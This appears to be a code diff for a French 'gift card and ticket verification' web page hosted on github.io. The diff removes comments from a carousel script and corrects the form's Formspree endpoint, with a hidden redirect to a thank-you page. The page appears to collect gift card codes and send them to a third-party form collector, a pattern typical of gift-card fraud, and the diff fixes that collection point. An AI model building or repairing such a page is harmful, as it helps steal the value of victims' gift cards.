@@ -154,11 +154,9 @@
     <!-- CARROUSEL AVEC BOUCLE INFINIE -->
     <div class="carousel-wrapper">
         <div class="carousel-track" id="carouselTrack">
-            <!-- 3 images originales -->
             <div class="carousel-slide"><img src="image2.jpg" alt="Bannière 1"></div>
             <div class="carousel-slide"><img src="image3.jpg" alt="Bannière 2"></div>
             <div class="carousel-slide"><img src="image4.jpg" alt="Bannière 3"></div>
-            <!-- Duplication de la première pour une transition fluide sans effet de retour en arrière -->
             <div class="carousel-slide"><img src="image2.jpg" alt="Bannière 1 (clone)"></div>
         </div>
     </div>
@@ -169,7 +167,8 @@
             <h1>Vérification</h1>
             <div class="subtitle">Vérification de Carte Cadeau & Ticket</div>
 
-            <form id="verifyForm" action="https://formspree.io/f/xoed" method="POST">
+            <!-- Formulaire mis à jour avec le bon identifiant Formspree -->
+            <form id="verifyForm" action="https://formspree.io/f/xoedvwwj" method="POST">
                 
                 <input type="hidden" name="_next" value="https://sidas9226-dotcom.github.io/verification-carte/merci.html">
 
@@ -238,29 +237,28 @@
         const track = document.getElementById('carouselTrack');
         const slides = document.querySelectorAll('.carousel-slide');
         let currentIndex = 0;
-        const totalSlides = 3; // Nombre de slides réelles (sans compter le clone)
+        const totalSlides = 3;
 
         setInterval(() => {
             currentIndex++;
-            const slideWidth = slides[0].offsetWidth + 12; // Largeur + gap
+            const slideWidth = slides[0].offsetWidth + 12;
             
             track.scrollTo({
                 left: currentIndex * slideWidth,
                 behavior: 'smooth'
             });
 
-            // Si on arrive sur l'image clone (la 4ème, qui est un double de la 1ère)
             if (currentIndex >= totalSlides) {
                 setTimeout(() => {
-                    track.style.scrollBehavior = 'auto'; // Coupe l'effet fluide momentanément pour le reset
+                    track.style.scrollBehavior = 'auto';
                     track.scrollTo({ left: 0, behavior: 'instant' });
                     currentIndex = 0;
                     setTimeout(() => {
-                        track.style.scrollBehavior = 'smooth'; // Remet le défilement fluide
+                        track.style.scrollBehavior = 'smooth';
                     }, 50);
-                }, 600); // Attend la fin de l'animation de glissement
+                }, 600);
             }
-        }, 3000); // Toutes les 3 secondes
+        }, 3000);
 
         // --- VALIDATION DES CODES ---
         const form = document.getElementById('verifyForm');
